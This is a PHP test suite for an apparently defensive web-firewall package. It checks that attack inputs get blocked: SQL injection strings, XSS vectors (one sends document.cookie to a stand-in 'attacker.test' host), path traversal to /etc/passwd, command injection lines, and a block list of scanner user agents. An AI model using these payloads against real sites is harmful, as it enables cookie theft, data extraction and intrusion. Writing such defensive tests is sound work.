<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;
use Mixudev\SecurityDefense\Middleware\RequestThreatScanner;
use Mixudev\SecurityDefense\Models\SecurityAlert;
use Mixudev\SecurityDefense\Tests\TestCase;

/**
 * Aggressive Security Defense Test Suite.
 * Validates active WAF prevention, payload inspection, Fail2Ban IP quarantine,
 * scanner anomaly blocking, and alert dispatching under realistic attack scenarios.
 */
class AggressiveSecurityDefenseTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        config()->set('security-defense.enabled', true);
        config()->set('security-defense.middleware.payload_scanner.enabled', true);
        config()->set('security-defense.middleware.payload_scanner.action', 'block');
        config()->set('security-defense.middleware.quarantine.enabled', true);
        config()->set('security-defense.middleware.quarantine.auto_jail_on_critical', true);
        config()->set('security-defense.middleware.quarantine.whitelist', []);

        Route::middleware(RequestThreatScanner::class)->group(function () {
            Route::get('/app/feed', static fn () => response()->json(['status' => 'success']));
            Route::get('/app/search', static fn (Request $request) => response()->json(['query' => $request->query('q')]));
            Route::post('/app/login', static fn (Request $request) => response()->json(['status' => 'logged_in']));
            Route::post('/app/comments', static fn (Request $request) => response()->json(['comment' => $request->input('body')]));
            Route::get('/app/download', static fn (Request $request) => response()->json(['file' => $request->query('file')]));
        });
    }

    public function test_aggressive_sqli_attack_vectors_are_detected_and_blocked(): void
    {
        $sqliVectors = [
            "' OR '1'='1",
            "admin'--",
            "1' UNION SELECT null, username, password FROM users--",
            "1; DROP TABLE users",
            "' OR 1=1 waitfor delay '0:0:5'--",
            "1' AND sleep(5)--",
            "select * from information_schema.tables",
        ];

        foreach ($sqliVectors as $index => $payload) {
            $ip = "198.51.100." . (10 + $index);

            // Test in Query String
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->get('/app/search?q=' . urlencode($payload));

            $this->assertSame(
                403,
                $response->getStatusCode(),
                "Failed to block SQLi payload in GET: {$payload}"
            );

            // Test in POST JSON Body
            $ipPost = "198.51.100." . (50 + $index);
            $postResponse = $this->withServerVariables(['REMOTE_ADDR' => $ipPost])
                ->postJson('/app/login', [
                    'username' => $payload,
                    'password' => 'secret',
                ]);

            $this->assertSame(
                403,
                $postResponse->getStatusCode(),
                "Failed to block SQLi payload in POST JSON: {$payload}"
            );
        }

        // Verify threats recorded in database
        $this->assertGreaterThan(0, SecurityAlert::where('threat_type', 'payload_injection')->count());
    }

    public function test_aggressive_xss_attack_vectors_are_detected_and_blocked(): void
    {
        $xssVectors = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:fetch('//attacker.test/steal?c='+document.cookie)",
            "<svg/onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "\" onfocus=\"alert(1)\" autofocus=\"",
        ];

        foreach ($xssVectors as $index => $payload) {
            $ip = "203.0.113." . (20 + $index);

            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/app/comments', [
                    'title' => 'Product Review',
                    'body' => $payload,
                ]);

            $this->assertSame(
                403,
                $response->getStatusCode(),
                "Failed to block XSS vector: {$payload}"
            );
        }
    }

    public function test_aggressive_path_traversal_and_lfi_vectors_are_blocked(): void
    {
        $traversalVectors = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/var/www/html/../../etc/passwd",
            "boot.ini",
        ];

        foreach ($traversalVectors as $index => $payload) {
            $ip = "192.0.2." . (30 + $index);

            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->get('/app/download?file=' . urlencode($payload));

            $this->assertSame(
                403,
                $response->getStatusCode(),
                "Failed to block Path Traversal vector: {$payload}"
            );
        }
    }

    public function test_aggressive_command_injection_vectors_are_blocked(): void
    {
        $cmdVectors = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(uname -a)",
            "& powershell -Command Get-Process",
        ];

        foreach ($cmdVectors as $index => $payload) {
            $ip = "192.0.2." . (70 + $index);

            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/app/comments', ['body' => 'ping ' . $payload]);

            $this->assertSame(
                403,
                $response->getStatusCode(),
                "Failed to block Command Injection vector: {$payload}"
            );
        }
    }

    public function test_known_vulnerability_scanners_are_blocked(): void
    {
        $scannerUserAgents = [
            'sqlmap/1.7#stable (http://sqlmap.org)',
            'Mozilla/5.0 (compatible; Nikto/2.1.6)',
            'gobuster/3.1.0',
            'DirBuster-1.0-RC1',
            'wpscan v3.8.22',
        ];

        foreach ($scannerUserAgents as $index => $ua) {
            $ip = "198.51.100." . (90 + $index);

            $response = $this->withServerVariables([
                'REMOTE_ADDR' => $ip,
                'HTTP_USER_AGENT' => $ua,
            ])->get('/app/feed');

            $this->assertSame(
                403,
                $response->getStatusCode(),
                "Failed to block malicious scanner UA: {$ua}"
            );
        }
    }

    public function test_fail2ban_auto_jail_on_critical_attack(): void
    {
        $attackerIp = '185.220.101.5';

        // 1. Attacker sends a critical SQLi exploit
        $exploitResponse = $this->withServerVariables(['REMOTE_ADDR' => $attackerIp])
            ->get('/app/search?q=' . urlencode("UNION SELECT 1,2,3 FROM users--"));

        $this->assertSame(403, $exploitResponse->getStatusCode());

        // 2. Attacker is now jailed. Subsequent request (even a completely benign one)
        // must be rejected immediately with HTTP 429 Too Many Requests.
        $subsequentResponse = $this->withServerVariables(['REMOTE_ADDR' => $attackerIp])
            ->get('/app/feed');

        $this->assertSame(429, $subsequentResponse->getStatusCode());
        $this->assertStringContainsString('quarantined', (string) $subsequentResponse->getContent());
    }

    public function test_whitelisted_ip_is_never_quarantined(): void
    {
        $trustedIp = '10.0.0.1';
        config()->set('security-defense.middleware.quarantine.whitelist', [$trustedIp]);

        // 1. Whitelisted IP sends suspicious payload (blocked by WAF)
        $response = $this->withServerVariables(['REMOTE_ADDR' => $trustedIp])
            ->get('/app/search?q=' . urlencode("<script>alert(1)</script>"));

        $this->assertSame(403, $response->getStatusCode());

        // 2. But the whitelisted IP is NOT quarantined; subsequent normal request passes through cleanly
        $nextResponse = $this->withServerVariables(['REMOTE_ADDR' => $trustedIp])
            ->get('/app/feed');

        $this->assertSame(200, $nextResponse->getStatusCode());
    }

    public function test_telegram_alert_is_sent_when_threat_detected(): void
    {
        config()->set('security-defense.alerts.telegram.enabled', true);
        config()->set('security-defense.alerts.telegram.bot_token', 'mock_token_123');
        config()->set('security-defense.alerts.telegram.chat_id', '8741993336');

        Http::fake([
            'api.telegram.org/bot*' => Http::response(['ok' => true], 200),
        ]);

        $attackerIp = '198.51.100.222';

        $response = $this->withServerVariables(['REMOTE_ADDR' => $attackerIp])
            ->get('/app/search?q=' . urlencode("UNION SELECT 1,2,3--"));

        $this->assertSame(403, $response->getStatusCode());

        // Verify Telegram HTTP notification was dispatched
        Http::assertSent(function ($request) {
            return str_contains($request->url(), 'sendMessage')
                && $request['chat_id'] === '8741993336'
                && str_contains($request['text'], 'Threat Type:')
                && str_contains($request['text'], 'payload_injection');
        });
    }
}
